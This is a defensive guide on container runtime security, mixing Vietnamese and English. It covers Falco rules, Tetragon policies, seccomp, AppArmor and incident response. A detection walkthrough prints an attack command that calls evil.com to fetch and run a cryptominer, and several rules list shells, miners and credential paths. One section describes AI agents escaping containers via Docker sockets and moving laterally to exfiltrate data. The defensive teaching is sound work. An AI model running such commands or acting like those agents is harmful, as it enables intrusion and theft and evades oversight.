# Container Security Series - Part 3: Runtime Security & Monitoring

> **Series:** Container Security Toàn Diện (2026 Edition)
> **Author:** Security Research Series
> **Date:** June 2026

---

## 1. The Image Scanning Gap

Image scanning tells you a vulnerability **exists**. Runtime security tells you when that vulnerability is **being exploited** — in real time, at the kernel level.

**Điều image scanning KHÔNG THỂ trả lời:**
- Container đang thực hiện system calls gì?
- Files nào đang được read/write trong lúc chạy?
- Processes nào đang spawn?
- Network connections nào đang được thiết lập?

**The Critical Gap:**
- Container với **zero known CVEs** vẫn có thể bị compromise qua logic vulnerabilities, zero-day, hoặc supply chain injection
- Container với **dozens of CVEs** có thể chạy nhiều năm mà không bị exploit — vulnerable code paths không bao giờ được reach

> Runtime visibility cho thấy vulnerabilities nào **thực sự đang bị trigger** vs chỉ là **theoretical risks**.

---

## 2. eBPF: The Security Observation Point

### 2.1. eBPF Là Gì?

eBPF (extended Berkeley Packet Filter) là Linux kernel technology cho phép chạy **sandboxed programs trong kernel** để respond to events.

```
┌─────────────────────────────────────────────────────────┐
│                    USER SPACE                             │
│  ┌─────────┐  ┌─────────┐  ┌─────────┐                │
│  │Container│  │Container│  │Container│   ← Malware     │
│  │  App A  │  │  App B  │  │  App C  │   can hide here │
│  └────┬────┘  └────┬────┘  └────┬────┘                │
├───────┼────────────┼────────────┼───────────────────────┤
│       │            │            │     KERNEL SPACE       │
│       ▼            ▼            ▼                        │
│  ┌─────────────────────────────────────┐                │
│  │         SYSCALL INTERFACE            │                │
│  │  execve │ connect │ openat │ write   │                │
│  └────────────────┬────────────────────┘                │
│                   │                                      │
│           ┌───────▼───────┐                              │
│           │  eBPF HOOKS   │  ← Cannot be bypassed       │
│           │  Observe ALL  │    from user space           │
│           │  Block/Allow  │                              │
│           └───────┬───────┘                              │
│                   │                                      │
│           ┌───────▼───────┐                              │
│           │ Falco/Tetragon│                              │
│           │  Rule Engine  │                              │
│           └───────────────┘                              │
└─────────────────────────────────────────────────────────┘
```

### 2.2. Tại Sao eBPF Cho Security?

| Capability | Description |
|-----------|-------------|
| **Kernel-level observation** | Observe ALL syscalls with full argument detail |
| **Cannot be bypassed** | Malware có thể hide từ tools trong container namespace, nhưng KHÔNG thể hide từ kernel |
| **Real-time blocking** | Block specific syscalls trước khi chúng complete |
| **Low overhead** | 1-5% CPU overhead (vs kernel module alternatives) |
| **Tamper-proof audit** | Audit trails không thể bị tampered từ user space |

### 2.3. eBPF: Double-Edged Sword

> eBPF lets you attach programs to kernel hooks and observe everything: every syscall, every network packet, every file operation. Security tools like Falco and Tetragon use this power defensively. Attackers use the same capability to build rootkits that hide activity from those tools.

---

## 3. Falco: Runtime Threat Detection

### 3.1. Falco Overview

**Falco** (CNCF Graduated Project) là most widely-deployed open-source runtime security tool:
- Sử dụng eBPF (hoặc kernel module) để observe system calls
- Match against rule engine → generate security alerts
- Community-contributed library of rules
- Custom rules với simple YAML-like DSL
- Phát hiện attack attempt trong **800ms** (real-world case study)

### 3.2. Falco Architecture

```
Container Workloads
       │
       ▼ (syscalls)
┌──────────────────┐
│   eBPF Driver    │  ← Captures syscall events
└────────┬─────────┘
         │
┌────────▼─────────┐
│  Falco Engine    │  ← Rule matching
│  (libsinsp)      │
└────────┬─────────┘
         │
┌────────▼─────────┐
│  Alert Outputs   │
│  • Stdout/Stderr │
│  • File          │
│  • Syslog        │
│  • HTTP/gRPC     │
│  • Kafka/NATS    │
└──────────────────┘
         │
         ▼
┌──────────────────┐
│  SIEM/Response   │
│  • Elasticsearch │
│  • Splunk        │
│  • PagerDuty     │
│  • AWS SecurityHub│
│  • Slack/Teams   │
└──────────────────┘
```

### 3.3. Falco Rules Essentials

#### Detect Cryptominer

```yaml
- rule: Container Cryptomining
  desc: Detect execution of known cryptomining binaries
  condition: >
    spawned_process and container
    and proc.name in (xmrig, minerd, cpuminer, ethminer, stratum)
  output: >
    Cryptominer detected
    (proc=%proc.name user=%user.name
     container=%container.name
     image=%container.image.repository)
  priority: CRITICAL
  tags: [container, cryptomining, mitre_execution]
```

#### Detect Shell Spawned from Web Server (RCE Indicator)

```yaml
- rule: Shell Spawned by Web Server
  desc: Web server process spawning a shell indicates potential RCE
  condition: >
    spawned_process
    and proc.name in (bash, sh, zsh, ash)
    and proc.pname in (nginx, apache2, httpd, php-fpm, node, python3)
  output: >
    Shell spawned by web server
    (shell=%proc.name parent=%proc.pname
     cmdline=%proc.cmdline
     container=%container.name)
  priority: HIGH
  tags: [container, mitre_execution, T1059]
```

#### Detect Container Escape Attempt

```yaml
- rule: Container Escape via Sensitive Mount
  desc: Detect writes to paths used for container escape
  condition: >
    open_write and container
    and (fd.name startswith /proc/sysrq-trigger
         or fd.name startswith /proc/sys/kernel/core_pattern
         or fd.name startswith /sys/kernel/uevent_helper)
  output: >
    Container escape attempt detected
    (file=%fd.name proc=%proc.name
     container=%container.name
     image=%container.image.repository)
  priority: CRITICAL
  tags: [container, escape, mitre_privilege_escalation]
```

#### Detect Credential Access (Metadata Service)

```yaml
- rule: Contact EC2 Metadata Service from Container
  desc: Detect container reaching AWS metadata for credential theft
  condition: >
    outbound and container
    and fd.sip="169.254.169.254"
    and not k8s.ns.name in (kube-system, aws-node)
  output: >
    Container contacting metadata service
    (container=%container.name image=%container.image.repository
     namespace=%k8s.ns.name connection=%fd.name)
  priority: HIGH
  tags: [container, credential_access, T1552]
```

#### Detect AWS ECS Task Events (Cloud Trail)

```yaml
- rule: ECS Task Run or Started
  condition: >
    aws.eventSource="ecs.amazonaws.com"
    and (aws.eventName="RunTask" or aws.eventName="StartTask")
    and not aws.errorCode exists
  output: >
    A new task started in ECS
    (user=%aws.user IP=%aws.sourceIP region=%aws.region
     cluster=%jevt.value[/requestParameters/cluster]
     task_definition=%aws.ecs.taskDefinition)
  source: aws_cloudtrail
```

### 3.4. Deploy Falco on Kubernetes

```bash
# Install via Helm
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm install falco falcosecurity/falco \
  --namespace falco --create-namespace \
  --set falcosidekick.enabled=true \
  --set falcosidekick.config.slack.webhookurl="https://hooks.slack.com/..." \
  --set driver.kind=ebpf
```

```yaml
# values.yaml — COMPLETE production configuration
falco:
  driver:
    kind: ebpf           # Preferred: no kernel headers needed, safer upgrades
    ebpf:
      hostNetwork: true  # Required for eBPF
  
  # Output settings
  json_output: true
  json_include_output_property: true
  json_include_tags_property: true
  
  # Rule files (order matters - later files override earlier)
  rules_file:
    - /etc/falco/falco_rules.yaml         # Default community rules
    - /etc/falco/falco_rules.local.yaml   # Overrides & tuning
    - /etc/falco/rules.d                   # Custom rules directory
  
  # Minimum priority to output (debug, info, notice, warning, error, critical)
  priority: notice
  
  # Performance tuning
  syscall_event_drops:
    threshold: 0.1       # Alert if >10% syscall events dropped
    actions: [log, alert]
  
  # Buffer settings (increase for high-throughput nodes)
  syscall_buf_size_preset: 4  # 0-7, higher = more memory but fewer drops
  
  # Metrics for monitoring Falco itself
  metrics:
    enabled: true
    interval: 15s
    output_rule: true

# Falcosidekick: alert routing to multiple targets
falcosidekick:
  enabled: true
  config:
    # Slack notifications for team
    slack:
      webhookurl: "https://hooks.slack.com/services/T.../B.../xxx"
      channel: "#security-alerts"
      minimumpriority: "warning"
      messageformat: |
        *{{ .Priority }}* in `{{ .Output_fields.container_name }}`
        Rule: {{ .Rule }}
        Namespace: {{ .Output_fields.k8s_ns_name }}
    
    # Elasticsearch for SIEM
    elasticsearch:
      hostport: "https://elasticsearch.monitoring:9200"
      index: "falco-alerts"
      type: "_doc"
      minimumpriority: "notice"
    
    # AWS SecurityHub
    aws:
      securityhub:
        region: "us-east-1"
        minimumpriority: "high"
    
    # PagerDuty for critical alerts
    pagerduty:
      routingkey: "your-pagerduty-integration-key"
      minimumpriority: "critical"
    
    # Webhook for custom automation (Falco Talon, Lambda, etc)
    webhook:
      address: "http://falco-response-engine:8080/alert"
      minimumpriority: "high"

  # Falcosidekick-UI for dashboards
  webui:
    enabled: true
    ingress:
      enabled: true
      hosts:
        - host: falco.internal.company.com

# DaemonSet resource allocation
resources:
  requests:
    cpu: 100m
    memory: 512Mi
  limits:
    cpu: 1000m
    memory: 1024Mi

# Tolerations to run on ALL nodes
tolerations:
  - effect: NoSchedule
    operator: Exists
```

### 3.5. Real-World Detection Walkthrough: Cryptominer Attack

**Scenario:** Attacker exploits vulnerable Node.js app → reverse shell → downloads xmrig

```bash
# Step 1: Attacker sends payload to vulnerable endpoint
curl -X POST http://victim-app/api/exec \
  -d '{"cmd": "curl http://evil.com/xmrig -o /tmp/xmrig && chmod +x /tmp/xmrig && /tmp/xmrig"}'
```

**Falco detects MULTIPLE indicators in sequence:**

```json
// Alert 1: Shell spawned from web server (T1059)
{
  "time": "2026-06-14T07:15:02.341Z",
  "priority": "Warning",
  "rule": "Shell Spawned by Web Server",
  "output": "Shell spawned by web server (shell=bash parent=node cmdline=bash -c curl... container=victim-app-7b4f8c)",
  "output_fields": {
    "container.name": "victim-app-7b4f8c",
    "k8s.ns.name": "production",
    "k8s.pod.name": "victim-app-7b4f8c-deployment-5d9b7f",
    "proc.name": "bash",
    "proc.pname": "node",
    "proc.cmdline": "bash -c curl http://evil.com/xmrig -o /tmp/xmrig && chmod +x /tmp/xmrig && /tmp/xmrig"
  }
}

// Alert 2: Outbound connection to suspicious IP (Lateral Movement)
{
  "time": "2026-06-14T07:15:02.512Z",
  "priority": "Notice",
  "rule": "Unexpected outbound connection",
  "output": "Outbound connection to 198.51.100.42:80 from victim-app"
}

// Alert 3: File written to /tmp then executed (T1105 + T1059)
{
  "time": "2026-06-14T07:15:03.101Z",
  "priority": "Error",
  "rule": "Write below binary dir or Write then execute in tmp",
  "output": "File created and executed in /tmp (file=/tmp/xmrig process=bash)"
}

// Alert 4: Known cryptominer binary detected (T1496)
{
  "time": "2026-06-14T07:15:03.450Z",
  "priority": "Critical",
  "rule": "Container Cryptomining",
  "output": "Cryptominer detected (proc=xmrig user=root container=victim-app-7b4f8c)"
}
```

**Automated response (via Falcosidekick webhook → response engine):**

```bash
# Response engine receives CRITICAL alert → automatic actions:
# 1. Apply quarantine NetworkPolicy (< 2 seconds after detection)
# 2. Send PagerDuty alert
# 3. Capture container state for forensics
# 4. Kill the pod after 30s (allow forensics capture)

# Total time: Detection → Containment = ~3 seconds
```

**Post-incident findings:**
- Root cause: Unpatched `express` library with RCE vulnerability (CVE-2026-XXXX)
- Container was running as root (no security context)
- No egress NetworkPolicy (allowed download from internet)
- No seccomp profile (allowed all syscalls)

**Fixes applied:**
1. Patch vulnerable dependency
2. Add `runAsNonRoot: true` + drop all capabilities
3. Add egress NetworkPolicy (deny by default)
4. Apply seccomp RuntimeDefault profile

---

## 4. Cilium Tetragon: Kernel-Level Enforcement

### 4.1. Tetragon vs Falco

| Feature | Falco | Tetragon |
|---------|-------|----------|
| **Primary mode** | Detection (alerts) | Detection + **Enforcement** |
| **Action on match** | Generate alert | Alert, Override syscall, **Sigkill** |
| **Response time** | Alert → downstream automation | **Block before syscall completes** |
| **CNCF status** | Graduated | Sandbox |
| **Best for** | Comprehensive monitoring | Critical enforcement points |

### 4.2. Tetragon TracingPolicy Examples

#### Block ptrace (Anti-Code Injection)

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: block-ptrace
spec:
  kprobes:
    - call: "sys_ptrace"
      syscall: true
      selectors:
        - matchNamespaces:
            - namespace: Pid
              operator: NotIn
              values: ["host_ns"]
          matchActions:
            - action: Sigkill
              message: "ptrace blocked in container"
```

#### Block Container Escape via core_pattern

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: block-container-escape
spec:
  kprobes:
    - call: "security_file_open"
      args:
        - index: 0
          type: "file"
      selectors:
        - matchArgs:
            - index: 0
              operator: "Prefix"
              values:
                - "/proc/sys/kernel/core_pattern"
                - "/proc/sysrq-trigger"
                - "/sys/kernel/uevent_helper"
          matchActions:
            - action: Sigkill
              message: "Container escape attempt blocked"
```

#### Block Outbound to Known-Bad IPs

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: block-c2-connections
spec:
  kprobes:
    - call: "tcp_connect"
      args:
        - index: 0
          type: "sock"
      selectors:
        - matchArgs:
            - index: 0
              operator: "DAddr"
              values:
                - "198.51.100.0/24"  # Known C2 range
          matchActions:
            - action: Sigkill
              message: "Connection to C2 blocked"
```

---

## 5. Seccomp: System Call Filtering

### 5.1. Seccomp Overview

Seccomp (Secure Computing Mode) restricts **which system calls** a container process can make.

- Docker default profile blocks ~44 dangerous syscalls
- Custom profiles cho specific workloads có thể restrict xuống 30-40 syscalls
- Exploit cố gắng dùng `ptrace`, `mount`, `clone` → **blocked by kernel**

### 5.2. Default Docker Seccomp Profile (Key Blocked Syscalls)

| Blocked Syscall | Attack It Prevents |
|----------------|-------------------|
| `ptrace` | Process injection, debugging |
| `mount` | Filesystem manipulation, escapes |
| `unshare` | Namespace manipulation |
| `clone` (with NEWNS) | Create new namespaces |
| `keyctl` | Kernel keyring manipulation |
| `reboot` | Host disruption |
| `kexec_load` | Load new kernel |
| `bpf` | eBPF program loading |

### 5.3. Custom Seccomp Profile

```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "architectures": ["SCMP_ARCH_X86_64"],
  "syscalls": [
    {
      "names": [
        "read", "write", "close", "fstat",
        "mmap", "mprotect", "munmap", "brk",
        "rt_sigaction", "rt_sigprocmask",
        "ioctl", "pread64", "pwrite64",
        "readv", "writev", "access",
        "pipe", "select", "sched_yield",
        "socket", "connect", "accept",
        "sendto", "recvfrom", "bind", "listen",
        "clone", "execve", "wait4",
        "openat", "getdents64", "getcwd",
        "futex", "epoll_create1", "epoll_ctl", "epoll_wait"
      ],
      "action": "SCMP_ACT_ALLOW"
    }
  ]
}
```

### 5.4. Apply Seccomp in Kubernetes

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: secure-app
spec:
  securityContext:
    seccompProfile:
      type: Localhost
      localhostProfile: profiles/custom-seccomp.json
  containers:
    - name: app
      image: myapp:latest
      securityContext:
        allowPrivilegeEscalation: false
        capabilities:
          drop: ["ALL"]
```

### 5.5. Generate Seccomp Profiles Automatically

```bash
# Use security profiles operator to record syscalls
# Install SPO (Security Profiles Operator)
kubectl apply -f https://raw.githubusercontent.com/kubernetes-sigs/security-profiles-operator/main/deploy/operator.yaml

# Create recording profile
kubectl apply -f - <<EOF
apiVersion: security-profiles-operator.x-k8s.io/v1alpha1
kind: SeccompProfile
metadata:
  name: myapp-profile
spec:
  defaultAction: SCMP_ACT_LOG  # Log all syscalls first
EOF

# After recording period, generate restrict profile
# SPO will create a profile with only observed syscalls allowed
```

---

## 6. AppArmor & SELinux

### 6.1. AppArmor Profile for Containers

```
#include <tunables/global>

profile container-default flags=(attach_disconnected,mediate_deleted) {
  #include <abstractions/base>

  # Deny write to sensitive paths
  deny /proc/sys/kernel/core_pattern w,
  deny /proc/sysrq-trigger w,
  deny /sys/kernel/uevent_helper w,
  deny /proc/kcore r,
  
  # Deny mount operations
  deny mount,
  deny umount,
  
  # Deny access to sensitive files
  deny /etc/shadow r,
  deny /etc/passwd w,
  
  # Allow normal application operations
  /app/** r,
  /app/data/** rw,
  /tmp/** rw,
  
  # Network
  network inet stream,
  network inet6 stream,
  
  # Deny raw sockets
  deny network raw,
  deny network packet,
}
```

### 6.2. Apply AppArmor in Kubernetes

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: secure-app
  annotations:
    container.apparmor.security.beta.kubernetes.io/app: localhost/container-default
spec:
  containers:
    - name: app
      image: myapp:latest
```

---

## 7. Key Attack Detection Patterns

### 7.1. Detection Matrix

| Attack Pattern | Indicators | Detection Method |
|---------------|-----------|-----------------|
| **Container Escape** | `unshare` with NEWNS/NEWPID, writes to `/proc/sysrq-trigger`, host path mounts | Falco rules + Seccomp block |
| **Credential Access** | Read `/etc/shadow`, SSH keys, K8s service account tokens, `/proc/self/environ` | Falco file access rules |
| **Lateral Movement** | New outbound connections to internal IPs, K8s API server access, metadata endpoint | Falco network rules |
| **Persistence** | Writes to cron dirs, `/etc/init.d`, `.bashrc`, startup scripts | Falco write monitoring |
| **Cryptomining** | High CPU + outbound to mining ports (3333, 4444, 5555, 14444) | Falco process + network rules |
| **Reverse Shell** | Shell connected to network socket | Falco process ancestry + fd monitoring |

### 7.2. MITRE ATT&CK Mapping for Containers

```
Initial Access ──→ Execution ──→ Privilege Escalation ──→ Lateral Movement
     │                │                    │                      │
     ▼                ▼                    ▼                      ▼
Vulnerable      Shell from           Container escape       Access metadata
image/app       web server           ptrace, mount          service, K8s API
                                     namespace manipulation  internal scanning
     │                │                    │                      │
     ▼                ▼                    ▼                      ▼
 [Trivy]         [Falco]             [Seccomp/Tetragon]       [Falco/NP]
```

---

## 7.3. NEW: AI Agent Threats & 2026 Attack Patterns

### The Agentic Threat Era (2026)

> On May 29, 2026, the Sysdig Threat Research Team observed the **first AI agent-driven container escape** — a fully automated kill chain that moved beyond the application layer to the orchestration plane.
> — Sysdig TRT

**Key statistics:**
- **1 in 8** reported AI security breaches now involves an agentic system (HiddenLayer 2026)
- **34%** increase in container-based lateral movement attacks through 2025 (Vectra AI)
- **51%** workload identities are completely inactive — attack vectors (Microsoft)
- AI frontier models can successfully escape containers via exposed Docker sockets, writable host mounts, and privileged containers (HelpNetSecurity)

### Why AI Agents Break Traditional Detection

| Traditional Attack | AI Agent Attack |
|-------------------|-----------------|
| Drops foreign binary | Uses only existing tools/identities |
| Generates exploit traffic | Looks like normal API calls |
| Single event triggers alert | Each step is policy-compliant individually |
| Noisy process spawning | Legitimate process behavior |
| Observable in single syscall | Malicious only in aggregate (causal chain) |

> "An AI agent moving laterally through a Kubernetes cluster does not look like an intrusion. There is no foreign process, no exploit, no dropped binary — just the agent using the identity, network routes, and tools it was handed at deployment."
> — ARMO Security

### AI-Specific Attack Chains (2026)

```
Attack 1: AI Agent Container Escape (Sysdig TRT, May 2026)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. Exploit vulnerable marimo notebook (CVE-2026-39987)
2. AI agent autonomously enumerates environment
3. Discovers mounted Docker socket
4. Escapes to host via Docker API
5. Pivots to orchestration plane
6. ALL steps automated — no human operator

Attack 2: LiteLLM Supply Chain (March 2026)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. Compromised LiteLLM package update
2. Harvests LLM API keys from environment
3. Steals Kubernetes configs (kubeconfig)
4. Exfiltrates cloud credentials (AWS/GCP)
5. Every infected environment compromised

Attack 3: AI Agent Lateral Movement
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. Agent deployed with legitimate permissions
2. Uses network routes it was "allowed" to access
3. Reads secrets it has RBAC permissions for
4. Connects to services via mTLS (valid identity)
5. Traditional tools see: "normal operation"
6. Actual behavior: data exfiltration
```

### Detecting AI-Specific Threats

```yaml
# Falco rule: Detect AI agent behavioral anomaly
# Key insight: detect PATTERNS not single events

- rule: AI Agent Unusual API Enumeration
  desc: >
    Detect rapid sequential K8s API calls indicating
    automated environment discovery (AI agent behavior)
  condition: >
    kevt and ka.verb in (list, get) and
    ka.target.resource in (secrets, configmaps, serviceaccounts, pods) and
    container and
    not ka.target.namespace in (kube-system)
  output: >
    Rapid K8s API enumeration detected - possible AI agent recon
    (user=%ka.user.name resource=%ka.target.resource
     namespace=%ka.target.namespace container=%container.name)
  priority: WARNING
  tags: [k8s, ai_agent, reconnaissance]

- rule: LLM Workload Accessing Cloud Credentials
  desc: Detect LLM/AI pods reading cloud credential files
  condition: >
    open_read and container and
    (fd.name startswith /root/.aws/ or
     fd.name startswith /root/.kube/ or
     fd.name = "/var/run/secrets/kubernetes.io/serviceaccount/token") and
    container.image.repository contains "llm" or
    container.image.repository contains "ollama" or
    container.image.repository contains "vllm"
  output: >
    AI/LLM workload reading cloud credentials
    (file=%fd.name image=%container.image.repository)
  priority: CRITICAL
  tags: [ai_workload, credential_access]
```

### Defenses Against AI Agent Threats

| Defense | Purpose |
|---------|---------|
| **Strict network egress policies** | AI agent cannot reach targets it shouldn't |
| **Short-lived tokens only** | Projected service account tokens (1h expiry) |
| **Behavioral baselining** | Detect aggregate anomalies, not single events |
| **Workload identity scoping** | LLM pods get ZERO K8s API access |
| **AI-specific monitoring** | Falco rules for rapid enumeration patterns |
| **Sandboxed execution** | gVisor/Kata for AI workloads |
| **Prompt injection defense** | Input validation before LLM processing |

---

## 8. Incident Response Workflow

### 8.1. Detection → Response Pipeline

```
Falco Alert → Falcosidekick → Response Actions
                    │
                    ├── Slack/Teams notification
                    ├── PagerDuty incident
                    ├── SIEM (Elasticsearch/Splunk)
                    ├── AWS SecurityHub finding
                    └── Kubernetes Response Engine
                              │
                              ├── Label pod (quarantine)
                              ├── Network policy (isolate)
                              ├── Delete pod
                              └── Capture forensics
```

### 8.2. Container Forensics Steps

```bash
# 1. PAUSE (don't kill immediately)
docker pause <container_id>
# or for K8s:
kubectl label pod <pod> quarantine=true

# 2. SNAPSHOT
docker export <container_id> > container-snapshot.tar
docker logs <container_id> > container-logs.txt

# 3. ISOLATE (apply network policy)
kubectl apply -f - <<EOF
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: quarantine-pod
spec:
  podSelector:
    matchLabels:
      quarantine: "true"
  policyTypes:
    - Ingress
    - Egress
  # No rules = deny all traffic
EOF

# 4. INVESTIGATE
# Explore filesystem
tar -xf container-snapshot.tar -C /investigation/
# Check for modified binaries
find /investigation/ -newer /investigation/etc/hostname -type f
# Check for unexpected processes (from Falco capture)
# Check network connections history

# 5. COLLECT EVIDENCE
# Falco event logs around the incident
# Container runtime logs
# Kubernetes audit logs
# Network flow logs
```

### 8.3. Automated Response với Falco Talon

```yaml
# Falco Talon response rules
- action: kubernetes:terminate
  parameters:
    gracePeriodSeconds: 0
  actionner: kubernetes
  conditions:
    - rule: Terminal Shell in Container
      priority: Critical

- action: kubernetes:networkpolicy
  parameters:
    allow: []  # Deny all
  conditions:
    - rule: Contact C2 Server
      priority: High
```

---

## 9. Runtime Security on AWS (ECS/EKS)

### 9.1. AWS Security Hub + Falco Integration

```yaml
# Falcosidekick config for AWS SecurityHub
falcosidekick:
  config:
    aws:
      securityhub:
        region: "us-east-1"
        minimumpriority: "high"
      cloudwatchlogs:
        loggroup: "/falco/alerts"
        logstream: "runtime-events"
```

### 9.2. Amazon GuardDuty for EKS Runtime Monitoring

```bash
# Enable EKS Runtime Monitoring
aws guardduty update-detector \
  --detector-id <detector-id> \
  --features '[{
    "Name": "EKS_RUNTIME_MONITORING",
    "Status": "ENABLED",
    "AdditionalConfiguration": [{
      "Name": "EKS_ADDON_MANAGEMENT",
      "Status": "ENABLED"
    }]
  }]'
```

### 9.3. GuardDuty Runtime Findings

| Finding Type | Description |
|-------------|-------------|
| `Execution:Runtime/NewBinaryExecuted` | New binary executed that wasn't in original image |
| `CryptoCurrency:Runtime/BitcoinTool.B!DNS` | DNS query to crypto mining pool |
| `UnauthorizedAccess:Runtime/MetadataModified` | Container accessing IMDS credentials |
| `Backdoor:Runtime/C&CActivity.B!DNS` | DNS query to known C2 server |

---

## 10. Production Deployment Checklist

### Runtime Security Stack

```
Layer 1: Seccomp          → Restrict available syscalls (kernel enforcement)
Layer 2: AppArmor/SELinux → MAC for file/network access (kernel enforcement)
Layer 3: Falco            → Detect anomalous behavior (eBPF observation)
Layer 4: Tetragon         → Block critical attacks (eBPF enforcement)
Layer 5: SIEM             → Correlate & investigate (centralized analysis)
```

### Deployment Steps

1. **Week 1-2:** Deploy Falco in **audit mode** — observe normal behavior
2. **Week 3-4:** Tune rules, eliminate false positives
3. **Week 5:** Integrate với SIEM và alerting
4. **Week 6:** Apply Seccomp profiles (start with Docker defaults)
5. **Week 7-8:** Generate custom Seccomp profiles per workload
6. **Week 9:** Deploy Tetragon for critical enforcement points
7. **Ongoing:** Review alerts, update rules, respond to incidents

### Key Metrics

| Metric | Target |
|--------|--------|
| Mean Time to Detect (MTTD) | < 1 minute |
| Mean Time to Respond (MTTR) | < 5 minutes (automated) |
| False positive rate | < 5% after tuning |
| Syscall monitoring coverage | 100% of production containers |
| eBPF CPU overhead | < 3% |

---

## 11. Key Takeaways

1. **Image scanning ≠ Runtime security** — cả hai đều cần thiết, nhưng không thể thay thế nhau
2. **eBPF** cung cấp kernel-level observation không thể bị bypass từ container
3. **Falco** là standard cho runtime threat detection (CNCF Graduated)
4. **Tetragon** thêm enforcement — block attacks trước khi syscall hoàn thành
5. **Seccomp + AppArmor** là first line of defense ở kernel level
6. **Start in audit mode** — 2-4 weeks baseline trước khi enforce
7. **Layer your defenses** — no single layer is sufficient
8. **Automate response** — Falcosidekick + response engine cho < 5min MTTR
9. **Correlate with SIEM** — runtime alert + known CVE = highest priority
10. **Container escape là CRITICAL** — always block writes to `/proc/sys/kernel/core_pattern`

---

## References

- AquilaX. "Container Runtime Security with eBPF: Beyond Image Scanning" (April 2026)
- AquilaX. "eBPF: The Double-Edged Sword of Cloud-Native Security"
- Falco Project. Official Documentation & Rules Library
- Sysdig. "Continuous runtime security monitoring with AWS Security Hub and Falco"
- HandsOnK8s. "Detecting and Preventing Container Threats in Production"
- Medium. "How to Detect Docker Container Escapes using AppArmor, SELinux, Seccomp & Falco"

---

*← [Part 2: Image Security & Supply Chain](./part2-image-security-supply-chain.md)*
*→ Tiếp theo: [Part 4: Kubernetes Security Hardening](./part4-kubernetes-security-hardening.md)*
